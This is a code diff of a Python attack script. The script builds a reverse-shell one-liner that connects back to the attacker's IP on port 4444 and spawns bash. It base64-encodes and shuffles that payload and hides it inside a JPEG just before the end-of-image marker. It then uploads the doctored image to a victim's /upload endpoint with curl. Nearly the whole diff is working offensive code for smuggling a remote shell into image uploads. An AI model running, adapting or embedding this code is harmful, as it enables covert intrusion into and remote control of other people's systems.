@@ -8,12 +8,11 @@ your_ip = sys.argv[1]
 victim_ip = sys.argv[2]
 mode = sys.argv[3]
 
-# if command given, run that command
-if (len(sys.argv) == 5):
-    text = "START:" + sys.argv[4]
-else: 
-    # encode the ip
-    text = f"""START:python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
+if len(sys.argv) == 5:
+    text = sys.argv[4]
+else:
+    text = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{your_ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
+
 encoded_bytes = base64.b64encode(text.encode("utf-8"))
 encoded_str = encoded_bytes.decode("ascii")
 
@@ -42,21 +41,34 @@ for i in range (len(arr1)):
 
 shuffled_str = "".join(arr2)
 
-# duplicate cat file
-command = ["cp", "cat.jpg", "catbackup.jpg"]
-subprocess.run(command)
+# add U1RBUlQ6 key
+start_b64 = base64.b64encode(b"START:").decode("ascii")
+payload_ascii = (start_b64 + shuffled_str).encode("ascii")
 
-# append command to cat file
-with open("catbackup.jpg", "a", encoding="utf-8") as f:
-    f.write(shuffled_str)
+# append eoi at the end of image file
+eoi = b"\xff\xd9"
+with open("cat.jpg", "rb") as src:
+    img_bytes = src.read()
 
-if (mode == "https"):
+if img_bytes.endswith(eoi):
+    img_bytes = img_bytes[:-2]
+
+with open("catbackup.jpg", "wb") as f:
+    f.write(img_bytes + payload_ascii + eoi)
+
+if mode == "https":
     url = f"https://{victim_ip}/upload"
-    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", "--cacert", "ca.crt", "--cert", "client.crt", "--key", "client.key", url]
-# default to http
-else: 
+    command = [
+        "curl", "-X", "POST", "--data-binary", "@catbackup.jpg",
+        "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg",
+        "--cacert", "ca.crt", "--cert", "client.crt", "--key", "client.key", url
+    ]
+else:
     url = f"http://{victim_ip}/upload"
-    command = ["curl", "-X", "POST", "--data-binary", "@catbackup.jpg", "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", url]
+    command = [
+        "curl", "-X", "POST", "--data-binary", "@catbackup.jpg",
+        "-H", "Content-Type: image/jpeg", "-H", "filename: catbackup.jpg", url
+    ]
 
 result = subprocess.run(command, capture_output=True, text=True, check=True)
 
@@ -82,7 +94,7 @@ def unshuffle(shuffled):
             result.append(arr[middle - count])
         count += 1
 
-    # The original shuffle took items from the end with pop().
+    # reverse the result
     result.reverse()
     return "".join(result)
 
